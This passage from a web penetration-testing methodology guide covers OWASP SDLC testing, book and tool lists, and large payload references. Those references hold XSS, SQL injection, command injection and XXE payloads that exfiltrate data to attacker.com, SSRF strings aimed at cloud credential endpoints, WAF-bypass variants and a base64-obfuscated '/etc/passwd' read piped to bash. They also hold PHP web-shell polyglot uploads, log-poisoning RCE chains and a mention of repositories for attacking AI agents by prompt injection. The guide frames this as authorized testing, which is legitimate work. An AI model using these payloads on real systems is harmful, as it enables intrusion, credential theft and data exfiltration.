- **Red Teaming** = Goal-based stealth. Test detection and response. Extended timeline. Simulates real adversary. Scope: anything to achieve objective.
- **Purple Teaming** = Red + Blue collaboration. Knowledge transfer focus. Red shares TTPs, Blue improves detection. No "win/lose" — shared learning.
- **Bug Bounty** = Recon-heavy, high-priority-first. Scope limited by program rules. Prioritize P1/P2 findings. Speed over thoroughness.

### Ethical Boundaries
- Never test without explicit written authorization
- Never exceed defined scope
- Never access, modify, or delete production data unnecessarily
- Never leave backdoors or persistent access
- Always clean up artifacts and test accounts
- Report critical findings immediately (don't wait for final report)
- Encrypt reports and deliver only to authorized recipients

### Continuous Learning
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free labs for all vulnerability classes
- [HackTricks](https://book.hacktricks.xyz) — Comprehensive pentest knowledge base
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — The definitive payload reference
- [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/) — Latest testing guide
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org) — Quick reference for secure implementations
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) — Real disclosed bug bounty reports
- [PentesterLab](https://pentesterlab.com) — Hands-on exercises with real vulnerabilities

---

## Part 15: WSTG SDLC Testing Framework (5 Phases)

The OWASP Testing Framework integrates security testing into the Software Development Lifecycle. This is the process-level methodology that governs WHEN testing should occur.

### Phase 1: Before Development Begins

**1.1 Define the SDLC**: Establish security gates and checkpoints at each SDLC stage. Assign security roles (Security Champion, AppSec Engineer). Document the approval process for security exemptions.

**1.2 Review Policies and Standards**: Verify existence of security policies (Acceptable Use, Data Classification, Incident Response). Check compliance requirements (PCI DSS, HIPAA, GDPR, SOC 2). Review coding standards — Java secure coding standard, cryptography standard. Ensure third-party supplier security requirements are defined.

**1.3 Develop Measurement Metrics**: Define metrics for security effectiveness — vulnerability density, mean time to fix, coverage percentage. Establish baselines for acceptable risk levels. Create dashboards for tracking security posture over time. Define pass/fail criteria for security gates.

### Phase 2: During Definition and Design

**2.1 Review Security Requirements**: Verify functional security requirements (authentication, authorization, session management). Check non-functional requirements (logging, auditing, encryption standards). Map regulatory requirements to technical controls. Review abuse cases alongside use cases. Ensure requirements are testable and unambiguous.

**2.2 Review Design and Architecture**: Perform architectural risk analysis using STRIDE. Review data flow diagrams for trust boundary violations. Verify defense-in-depth across all layers (network, application, database). Check for single points of failure in security controls. Validate sensitive data segmentation and encryption at rest/in transit.

**2.3 Create and Review UML Models**: Review use-case diagrams for abuse case coverage. Analyze sequence diagrams for insecure data flows. Check deployment diagrams for insecure network segmentation. Review activity diagrams for business logic flaws. Verify state machine diagrams for session and state management.

**2.4 Create and Review Threat Models**: Identify assets, trust boundaries, and threat agents. Apply structured methodology (PASTA, STRIDE, TRIKE). Rate threats using DREAD or CVSS scores. Document mitigations and residual risks. Update threat models as the application evolves.

### Phase 3: During Development

**3.1 Code Walkthrough**: High-level code review with developers explaining logic and flow. Understand code structure, layout, and design decisions. Not a full code review — context building for deeper analysis.

**3.2 Code Reviews**: Static code validation against checklists:
- Business requirements (availability, confidentiality, integrity)
- OWASP Top 10 checklists for technical exposures
- Language-specific issues (Scarlet paper for PHP, Microsoft Secure Coding for ASP.NET)
- Industry-specific requirements (SOX 404, HIPAA, PCI DSS, GDPR)
- Static code reviews produce the highest quality returns per time invested

### Phase 4: During Deployment

**4.1 Application Penetration Testing**: Full black-box/gray-box testing of deployed application. Final check that no issues were missed in earlier phases. Incorporates all WSTG test categories.

**4.2 Configuration Management Testing**: Infrastructure deployment review. Check for default settings, unnecessary services, insecure configurations. Verify hardening against CIS benchmarks.

### Phase 5: During Maintenance and Operations

**5.1 Operational Management Reviews**: Documented process for operational management of application and infrastructure security.

**5.2 Periodic Health Checks**: Monthly or quarterly health checks on both application and infrastructure. Ensure no new security risks have been introduced. Verify security posture is maintained.

**5.3 Change Verification**: After every production change, validate that security level has not been degraded. Integrated into change management process.

---

## Part 16: Fuzz Vectors Reference

### XSS Payloads

```
<!-- Basic vectors -->
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Polyglots (work across multiple contexts) -->
javascript:alert(1)
'"(){};:-->
<svg/onload=alert(1)>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e

<!-- Event handlers -->
onmouseover=alert(1)
onfocus=alert(1)
onblur=alert(1)
onchange=alert(1)
oninput=alert(1)
onkeydown=alert(1)

<!-- Encoded bypasses -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E
&lt;script&gt;alert(1)&lt;/script&gt;
\x3cscript\x3ealert(1)\x3c/script\x3e
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- WAF bypass -->
<ScRiPt>alert(1)</ScRiPt>
<script/random>alert(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### SQL Injection Payloads

```
<!-- Detection -->
'
"
\
)
;--
' OR '1'='1
' AND '1'='2
' OR 1=1--
admin'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL--

<!-- Time-based blind -->
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' OR pg_sleep(5)--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
' OR BENCHMARK(5000000,MD5(1))--

<!-- Boolean blind -->
' AND 1=1-- (true)
' AND 1=2-- (false)
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

<!-- Stacked queries -->
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
'; COPY (SELECT '') TO PROGRAM 'id'-- (PostgreSQL)

<!-- Out-of-band -->
'; DECLARE @q VARCHAR(99);SET @q='\\attacker.com\'+(SELECT @@version);EXEC master..xp_dirtree @q--
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--
```

### Command Injection Payloads

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
%0d%0a id
\n id
'&id&'
"; id; echo "
;`echo${IFS}"aWQ="|base64${IFS}-d`
; cat /etc/passwd
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

### Path Traversal Payloads

```
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd (double encoding)
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd (UTF-8 overlong)
../../../etc/passwd%00 (null byte)
....////....////....////etc/passwd
/var/www/html/../../../../etc/passwd
```

### SSRF Payloads

```
http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
http://127.0.0.1:22
http://localhost:8080
http://[::1]:22
http://0.0.0.0:8080
http://0177.0.0.1:22 (octal)
http://2130706433:22 (decimal)
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a (Redis via gopher)
dict://127.0.0.1:6379/info
```

### XXE Payloads

```xml
<!-- File disclosure -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind XXE via OOB -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<foo>&xxe;</foo>

<!-- Parameter entities (blind) -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- Billion Laughs DoS -->
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<foo>&lol4;</foo>
```

### JWT Attack Payloads

```
# alg:none — set "alg":"none" and remove signature
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","iat":1516239022}
# Signature: (empty)

# RS256->HS256 — sign with public key
jwt_tool <token> -X k -pk public.pem

# kid path traversal to /dev/null
# Header: {"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}
# Sign with empty secret

# kid SQL injection
# Header: {"alg":"HS256","typ":"JWT","kid":"x' UNION SELECT 'secret_key'-- -"}
```

---

## Part 17: Encoded Injection Reference

Attackers use various encoding schemes to bypass input filters and WAFs. Always test encoded variants.

### URL Encoding
| Character | Encoded | Double Encoded |
|-----------|---------|---------------|
| space | %20 | %2520 |
| ' | %27 | %2527 |
| " | %22 | %2522 |
| ; | %3B | %253B |
| / | %2F | %252F |
| \ | %5C | %255C |
| < | %3C | %253C |
| > | %3E | %253E |
| % | %25 | %2525 |
| null | %00 | %2500 |

### HTML Entity Encoding
| Character | Named | Decimal | Hex |
|-----------|-------|---------|-----|
| < | &lt; | &#60; | &#x3c; |
| > | &gt; | &#62; | &#x3e; |
| " | &quot; | &#34; | &#x22; |
| ' | &apos; | &#39; | &#x27; |
| & | &amp; | &#38; | &#x26; |

### Unicode Encoding
- Full-width: `＜` (U+FF1C), `＞` (U+FF1E)
- UTF-7: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
- UTF-16: `\u003cscript\u003e`
- UTF-8 overlong: `%c0%ae` → `.`, `%c0%af` → `/`

### Base64 Encoding
- Standard: `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` → `<script>alert(1)</script>`
- URL-safe: `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg`

### Multi-byte & Character Set Attacks
- Shift_JIS: `%83%74` can be interpreted as different bytes depending on charset
- GBK/GB2312: multi-byte sequences where trailing byte matches ASCII escape characters
- NUL byte injection: `%00`, `\x00`, `\0`
- Newline injection: `%0a` (LF), `%0d` (CR), `%0d%0a` (CRLF)

### Encoding Bypass Strategies
1. **Single encoding** (URL encode once) — bypasses simple keyword filters
2. **Double encoding** (`%25` → `%`) — bypasses single-decode filters
3. **Mixed encoding** (combine URL + HTML + Unicode) — bypasses complex WAFs
4. **Case variation** (`<ScRiPt>`) — bypasses case-sensitive filters
5. **Null byte injection** (`%00`) — bypasses C-string based filters
6. **Unicode normalization** — NFC/NFD form differences
7. **Overlong UTF-8** — multi-byte encoding of ASCII characters
8. **Homograph attacks** — visually identical Unicode characters

---

## Part 18: Books & Literature Reference

### Essential Web Security Books

| Title | Author(s) | Year | Focus |
|-------|-----------|------|-------|
| **The Web Application Hacker's Handbook (2nd Ed.)** | Dafydd Stuttard, Marcus Pinto | 2011 | THE canonical web hacking reference. Chapter 21 methodology is essential. |
| **The Tangled Web** | Michal Zalewski | 2011 | Deep dive into browser security model, SOP, HTML parsing quirks. |
| **Real-World Bug Hunting** | Peter Yaworski | 2019 | Case-study approach to web vulnerabilities. Practical bug bounty examples. |
| **Bug Bounty Bootcamp** | Vickie Li | 2021 | Modern bug bounty methodology with hands-on examples. |
| **Web Security for Developers** | Malcolm McDonald | 2020 | Developer-focused security with real-world attack examples. |
| **OWASP Testing Guide (WSTG)** | OWASP Community | v4.2 | THE free, authoritative step-by-step testing guide. |

### Penetration Testing Books

| Title | Author(s) | Year | Focus |
|-------|-----------|------|-------|
| **The Hacker Playbook 3** | Peter Kim | 2018 | Practical red teaming and penetration testing workflows. |
| **Penetration Testing: A Hands-On Introduction** | Georgia Weidman | 2014 | Full pentest lifecycle from beginner perspective. |
| **Red Team Field Manual (RTFM)** | Ben Clark | 2014 | Quick reference of commands for red team ops. |
| **Advanced Penetration Testing** | Wil Allsopp | 2017 | Advanced red team TTPs and covert operations. |
| **Metasploit: The Penetration Tester's Guide** | David Kennedy et al. | 2011 | Comprehensive Metasploit usage guide. |
| **Black Hat Python** | Justin Seitz | 2014 | Python tools for hacking and pentesting. |
| **Gray Hat Hacking (5th Ed.)** | Harper, Eagle, et al. | 2018 | Ethical hacking with exploit development focus. |

### Specialized References

| Title | Author(s) | Focus |
|-------|-----------|-------|
| **Serious Cryptography** | Jean-Philippe Aumasson | Applied crypto — essential for crypto vulnerability testing |
| **Attacking Network Protocols** | James Forshaw | Network protocol analysis and exploitation |
| **Android Hacker's Handbook** | Joshua Drake et al. | Mobile security testing for Android |
| **iOS Hacker's Handbook** | Miller, Blazakis, et al. | Mobile security testing for iOS |
| **Hacking APIs** | Corey Ball | API-focused penetration testing methodology |
| **Attacking and Exploiting Modern Web Applications** | Simone Onofri, Donata Onofri | 2024 — covers modern stacks (SPA, GraphQL, Serverless) |

### Standards & Official Publications
- **NIST SP 800-115**: Technical Guide to Information Security Testing and Assessment
- **PTES**: Penetration Testing Execution Standard (pentest-standard.org)
- **OSSTMM 3.0**: Open Source Security Testing Methodology Manual (isecom.org)
- **MITRE ATT&CK**: Adversarial Tactics, Techniques, and Common Knowledge (attack.mitre.org)
- **OWASP ASVS v4.0.3**: Application Security Verification Standard
- **OWASP WSTG v4.2**: Web Security Testing Guide
- **OWASP Top 10:2021**: Top 10 Web Application Security Risks
- **OWASP API Security Top 10:2023**: API-specific security risks
- **OWASP MASVS**: Mobile Application Security Verification Standard
- **CIS Benchmarks**: Configuration hardening standards
- **PCI DSS v4.0**: Payment Card Industry security requirements
- **CWE Top 25**: Most dangerous software weaknesses

---

## Part 19: GitHub Security Skill & Tool Repositories

### Reference Pentest Skills (for skill structure inspiration)

| Repository | Stars | Key Features |
|-----------|-------|-------------|
| **0x0pointer/skills** | 13 | 25+ offensive security skills with SKILL.md format, phased workflows, chaining tables |
| **0xSteph/pentest-ai-agents** | 2000+ | 50 Claude Code subagents, Tier 1 (advisory) vs Tier 2 (execution) separation, scope guard |
| **milsoslim/kali-pentest** | — | 199 CLI tools, 15 playbooks, 4-layer document hierarchy, depth enforcement directives |
| **Wakhungila/bug-bounty-ai-prompts** | — | 43 multi-client agents, phase-organized, supports Claude/Copilot/Cursor |
| **0x-Professor/Agent-Skills-Hub** | 10 | 44 skills with CI validation, standardized skill contracts, smoke/scenario tests |
| **isaacs-12/pentest-agent** | — | 40 Python code-based skills, evidence graph, XBOW benchmark 62.2% |
| **NeaByteLab/Pentest-Skill** | 2 | 7-phase linear pentest prompts, simple starting template |
| **gangj277/hack-your-agent** | — | AI agent red-teaming skill (prompt injection, MCP poisoning) |
| **PurpleAILAB/Decepticon** | — | External reference integration pattern (HackerOne, PayloadsAllTheThings) |

### Comprehensive Methodology Repos

| Repository | Stars | Content |
|-----------|-------|---------|
| **enaqx/awesome-pentest** | 26500+ | THE definitive pentest resource list — tools, books, courses, CTFs |
| **swisskyrepo/PayloadsAllTheThings** | 60000+ | 50+ vulnerability categories with payloads, intruder files, images |
| **danielmiessler/SecLists** | 58000+ | 6200+ wordlists for discovery, fuzzing, passwords, usernames |
| **m14r41/PentestingChecklist** | 68 | Interactive checklist: 23 platforms, 1000+ checks, 4-level hierarchy |
| **jamescndubuisi/Pentest-Guide** | — | 3700-line master checklist, Parts A-V, 32 agent skills, safety model |
| **Hari-prasaanth/Web-App-Pentest-Checklist** | 903 | OWASP-based with 500+ test cases, Notion integration |
| **six2dez/pentest-book** | 1000+ | Full pentest methodology, recon scripts, checklists |
| **kOaDT/awesome-pentest-tools** | 2 | Vendor-agnostic AI pentest agent using only tools from curated list |
| **thau0x01/ai-pentest-kb** | — | Framework-aligned checklists: PTES, OSSTMM, NIST, MITRE mapped to test items |

### Key Skill Structural Patterns to Emulate

1. **SKILL.md YAML Frontmatter**: `name`, `description` with triggers, `argument-hint`, `user-invocable`
2. **Phased Workflow**: Scope → Discovery → Exploit → Report as standard flow
3. **Scope Guard**: `_scope-guard.md` overlay mechanism for all agents
4. **Tier Separation**: Advisory-only (Tier 1) vs execution-capable (Tier 2) agents
5. **Document Layering**: Entry → Playbook → Tool Selection → Tool Reference
6. **Depth Enforcement**: "test ALL", coverage matrices, stopping conditions
7. **Evidence Graph**: Evidence → Hypothesis → Vulnerability → Exploit chain
8. **Multi-Client Support**: Auto-detect Claude/Copilot/Cursor for install
9. **CI Validation**: Smoke tests, scenario tests, security regression tests per skill
10. **Framework Grounding**: Every test mapped to OWASP WSTG, ASVS, MITRE ATT&CK

---

## Part 20: Burp Suite & OWASP ZAP Quick Reference

### Burp Suite Extensions for Pentesting

| Extension | Purpose |
|-----------|---------|
| **Active Scan++** | Enhanced active scanning with additional checks |
| **Autorize** | Automated authorization testing (IDOR detection) |
| **Param Miner** | Hidden parameter discovery + cache poisoning detection |
| **Turbo Intruder** | High-speed request engine for race conditions |
| **HTTP Request Smuggler** | Smuggling vulnerability detection |
| **InQL** | GraphQL introspection and testing |
| **Retire.js** | Outdated JavaScript library detection |
| **JWT Editor** | JWT manipulation, signing, and attack automation |
| **DOM Invader** | DOM XSS source/sink detection in browser |
| **Logger++** | Enhanced request/response logging |
| **403 Bypasser** | 403 Forbidden bypass techniques |
| **Backslash Powered Scanner** | Intelligent scanning with fewer false positives |
| **Collaborator Everywhere** | Insert Collaborator payloads across all injection points |
| **Content Type Converter** | Auto-convert between JSON/XML/URL-encoded |
| **Upload Scanner** | File upload vulnerability detection |
| **WSDL Wizard** | SOAP/WSDL service scanning |
| **Software Vulnerability Scanner** | Known CVE detection in software versions |

### OWASP ZAP Add-ons

| Add-on | Purpose |
|--------|---------|
| **Active Scanner** | Automated vulnerability scanning |
| **AJAX Spider** | JavaScript-aware crawling |
| **WebSocket Support** | WebSocket message interception |
| **GraphQL Support** | GraphQL endpoint testing |
| **SOAP Support** | SOAP/WSDL parsing and testing |
| **Fuzzer** | Customizable request fuzzing |
| **Forced Browse** | Directory/file brute-forcing |
| **OpenAPI Support** | Swagger/OpenAPI import and testing |

### Burp Suite Keyboard Shortcuts (Pro)

| Shortcut | Action |
|----------|--------|
| Ctrl+R | Send to Repeater |
| Ctrl+I | Send to Intruder |
| Ctrl+Shift+D | Send to Decoder |
| Ctrl+F | Search |
| Ctrl+Shift+F | Search across all items |
| Ctrl+Z | Undo |
| Ctrl+Y | Redo |
| Ctrl+Shift+R | Go to Repeater tab |
| Ctrl+Shift+I | Go to Intruder tab |
| Ctrl+Shift+T | Go to Target tab |

---

## Part 21: Quick Command Reference (One-Liners)

### Recon One-Liners
```bash
# Subdomain enumeration pipeline
subfinder -d example.com -silent | anew subs.txt | dnsx -silent | httpx -silent -title -tech-detect -status-code -cdn -o live.txt

# URL collection pipeline  
gau example.com | anew urls.txt | httpx -silent -mc 200 -o alive_urls.txt

# JavaScript analysis one-liner
echo example.com | gau | grep '\.js$' | httpx -silent -mc 200 | xargs -I{} sh -c 'curl -s {} | jsluice' > endpoints.json

# Nuclei scan on all alive hosts
cat live.txt | nuclei -t ~/nuclei-templates/ -severity critical,high -o nuclei_critical.txt

# XSS parameter hunting
echo example.com | gau | gf xss | sort -u | dalfox pipe --silence -o xss_results.txt

# SQLi parameter hunting  
echo example.com | gau | gf sqli | sort -u | sqlmap -m - --batch --level 2

# Open redirect hunting
echo example.com | gau | gf redirect | sort -u | httpx -silent -mc 301,302 -location -o redirects.txt

# Subdomain takeover check
subfinder -d example.com -silent | httpx -silent | nuclei -t ~/nuclei-templates/http/takeovers/ -o takeover.txt
```

### Content Discovery One-Liners
```bash
# Directory brute-force with ffuf
ffuf -w ~/wordlists/common.txt -u https://target.com/FUZZ -mc 200,301,302,403 -o ffuf_results.json

# Recursive content discovery with feroxbuster
feroxbuster -u https://target.com -w ~/wordlists/raft-large-directories.txt -d 3 -o ferox_results.json

# Virtual host brute-force
ffuf -w ~/wordlists/subdomains.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fc 200,400 -o vhosts.json

# Parameter discovery with arjun
arjun -u https://target.com/api/endpoint -oT params.txt

# API endpoint discovery
echo target.com | gau | grep -E 'api|v1|v2|graphql|swagger|openapi' | sort -u > api_endpoints.txt
```

### Exploitation One-Liners
```bash
# SQLMap automated
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# Command injection test
curl -X POST "https://target.com/cmd" -d "cmd=;id"  # or "cmd=|id" or "cmd=\`id\`"

# SSRF test (check Collaborator for callbacks)
curl "https://target.com/fetch?url=http://YOUR-COLLABORATOR.burpcollaborator.net"

# LFI test with PHP filter chain
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"

# JWT decode (check payload without verifying)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | cut -d'.' -f2 | base64 -d 2>/dev/null

# Hash cracking with hashcat
hashcat -m 1000 hashes.txt ~/wordlists/rockyou.txt -r ~/rules/best64.rule -O

# Hydra brute-force on HTTP form
hydra -l admin -P ~/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

---

## Part 22: WAF Bypass Techniques

### WAF Detection
```
wafw00f https://target.com
nmap --script http-waf-detect -p 80,443 target.com
# Manual: send basic XSS payload, observe response
curl -s "https://target.com/?q=<script>alert(1)</script>" | grep -i "blocked\|forbidden\|waf\|cloudflare\|akamai"
```

### Common WAFs and Known Weaknesses
| WAF | Detection Signature | Bypass Weakness |
|-----|-------------------|-----------------|
| Cloudflare | cf-ray header, __cfduid cookie | Case variation, encoding tricks, origin IP discovery |
| AWS WAF | x-amzn-RequestId | HTTP parameter pollution, JSON body bypass |
| Azure WAF | Azure header patterns | Content-Type manipulation, HTTP/2 |
| ModSecurity | Specific error messages | Multi-part bypass, encoding layering |
| Imperva/Incapsula | _incap_ cookie | JSON body, WebSocket upgrade |
| F5 BIG-IP ASM | TS cookie | Request smuggling, chunked encoding |
| FortiWeb | Block page patterns | Chunked bypass, parameter placement |
| Sucuri | sucuri_cloudproxy cookie | Direct origin IP access |

### SQL Injection WAF Bypass
```
# Case variation: SeLeCt * FrOm users
# Inline comments: /*!50000SELECT*/ * FROM users
# Whitespace alternatives: SELECT/**//**/FROM/**/users
# URL encoding: %53%45%4C%45%43%54
# Double encoding: %2553%2545%254C%2545%2543%2554
# Hex (MySQL): 0x73656C656374202A2066726F6D207573657273
# Concatenation: CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))
# Parameter pollution: ?id=1&id=1' UNION SELECT 1,2,3--
# JSON body injection (bypasses URL param WAF): {"id": "1' UNION SELECT 1,2,3--"}
# Chunked transfer encoding: Transfer-Encoding: chunked
```

### XSS WAF Bypass
```
<ScRiPt>alert(1)</ScRiPt>
<svg/onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="jAvAsCrIpT:alert(1)">
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
<img src=x onerror="self['alert'](1)">
# DOM-based bypass (fragment never sent to server)
# Upload-based bypass (payload in filename)
```

### Path Traversal WAF Bypass
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd (double)
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd (UTF-8 overlong)
....//....//....//etc/passwd
..\..\..\windows\win.ini
/etc/passwd (absolute path)
```

### Command Injection WAF Bypass
```
| id
%0a id  (newline)
`id`
$(id)
cat${IFS}/etc/passwd  ($IFS instead of space)
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
/bin/c?t /etc/passwd  (wildcard)
cat</etc/passwd
```

### General WAF Bypass Strategies
1. HTTP Method Switching (POST→GET, PUT, PATCH)
2. Content-Type Manipulation (urlencoded↔JSON↔multipart)
3. Parameter Pollution (WAF checks first param, backend uses last)
4. Chunked Transfer Encoding (WAF doesn't reassemble)
5. HTTP/2 Multiplexing (different frame handling)
6. Request Smuggling (bypass WAF entirely)
7. Origin IP Discovery (Shodan, Censys, SSL certs, DNS history)
8. Encoding Layering (multiple decode stages)
9. Parameter Placement (move payload: URL→body→header→cookie)
10. Cloud Metadata Redirection (SSRF to bypass external WAF)

---

## Part 23: Vulnerability Chaining Patterns

### Chain 1: XSS → CSRF → Account Takeover
Find XSS → read CSRF token from page → send password change request from victim's browser → attacker receives reset email → full account takeover.

### Chain 2: Open Redirect → OAuth Token Theft
Find open redirect → craft OAuth URL with attacker's domain in redirect_uri → victim authenticates → auth code sent to attacker → token theft.

### Chain 3: LFI → Log Poisoning → RCE
Find LFI → inject PHP code into access log via User-Agent: `<?php system($_GET['cmd']); ?>` → include contaminated log: `?file=/var/log/apache2/access.log&cmd=id` → RCE.

### Chain 4: LFI → PHP Filter Chain → RCE
PHP filter chain via `php://filter/convert.iconv.*` character conversions → construct arbitrary PHP code from existing files. Tool: php_filter_chain_generator.py.

### Chain 5: File Upload → LFI → RCE
Upload web shell (try .php, .pht, .php5, .phtml, .phar, .shtml) → find upload path → include via LFI or direct access.

### Chain 6: SSRF → IMDS → Cloud Account Takeover
SSRF → cloud metadata endpoint (169.254.169.254) → extract IAM credentials → access S3/RDS → pivot to full cloud compromise.

### Chain 7: SQLi → File Write → Web Shell
SQL injection with stacked queries → MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO` → write PHP/ASPX shell to webroot → access shell.

### Chain 8: SSRF → Internal Service Exploitation
SSRF → scan internal network → find Redis/Memcached/Elasticsearch → protocol smuggling via gopher:// → RCE or data access.

### Chain 9: IDOR + Weak Password Reset → Admin Takeover
IDOR to enumerate user IDs → weak reset token → brute-force/guess admin reset token → admin account takeover.

### Chain 10: Subdomain Takeover → Phishing → Credential Harvest
Dangling CNAME → claim cloud resource (GitHub Pages/S3/Azure) → host phishing page on legitimate subdomain → harvest credentials.

### Chain 11: Race Condition → Multi-Coupon Redemption
HTTP/2 single-packet attack → 20+ simultaneous coupon redemptions → server applies before marking used → massive discount.

### Chain 12: Host Header Injection → Password Reset Poisoning
Modify Host header in password reset request → reset link sent with attacker's domain → victim clicks → attacker captures token.

---

## Part 24: File Upload Testing Deep Dive

### Extension Blacklist Bypass
```
# PHP variants to try:
.php   .php5   .phtml   .pht   .phar   .phps   .php7   .php8
.pHp   .PHP   (case bypass)
.php.   .php .   (trailing dot/space)
.php::$DATA   (NTFS alternate data stream)
.php%00.jpg   (null byte, legacy)
.php.jpg   (double extension — depends on parser order)
.asp;.jpg   (IIS semicolon parsing)
```

### Content-Type/MIME Bypass
```
# Change Content-Type header:
Content-Type: image/jpeg  →  Content-Type: application/x-php
Content-Type: image/png   →  Content-Type: text/plain

# Some servers only check extension, not Content-Type
# Others check magic bytes
```

### Magic Byte Bypass (Polyglot Files)
```
# Valid image + PHP code (GIF example):
GIF89a<?php system($_GET['cmd']); ?>

# PNG:
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

# JPEG (keep valid header):
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>

# Create polyglot with exiftool:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Or manual:
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

### Server-Specific Parsing Tricks
```
# Apache .htaccess override:
Upload .htaccess file with: AddType application/x-httpd-php .jpg
Then upload shell.jpg → executed as PHP

# IIS 6.0: ;.asp parsing
shell.asp;.jpg → executed as .asp
# IIS 7.5+: double extension if handler mapped
# Nginx: misconfigured fastcgi_pass + file.jpg/php

# Apache mod_cgi: .cgi, .pl execution
```

### Content-Disposition & multipart Boundary Tricks
```
# No filename:
Content-Disposition: form-data; name="file"

# Multiple files in one field:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.jpg"

# Path traversal in filename:
filename="../../shell.php"
filename="..\..\shell.aspx"
```

### SVG-Based Attacks
```xml
<!-- Stored XSS via SVG upload -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>

<!-- XXE via SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <text>&xxe;</text>
</svg>

<!-- Server-side request via SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### Post-Upload Exploitation
1. **Extension bypass**: Try all PHP/ASP/JSP variants
2. **Double write race condition**: Write + read before extension check completes
3. **Archive extraction**: Upload .zip → extract reveals .php inside
4. **Image processing library exploitation**: ImageTragick (CVE-2016-3714)
5. **Path traversal in upload path**: Overwrite .htaccess or existing files
6. **ZIP slip**: Path traversal inside .zip filenames during extraction
7. **XML-based file parsing**: Upload .docx/.xlsx with XXE payloads

---

## Part 25: PortSwigger Web Security Academy Lab Mapping

Map WSTG tests to hands-on labs for practice:

| WSTG Category | PortSwigger Lab Topics |
|---------------|----------------------|
| **SQL Injection (INPV-05)** | SQL injection (all types), Blind SQL injection |
| **XSS (INPV-01/02)** | Reflected XSS, Stored XSS, DOM XSS |
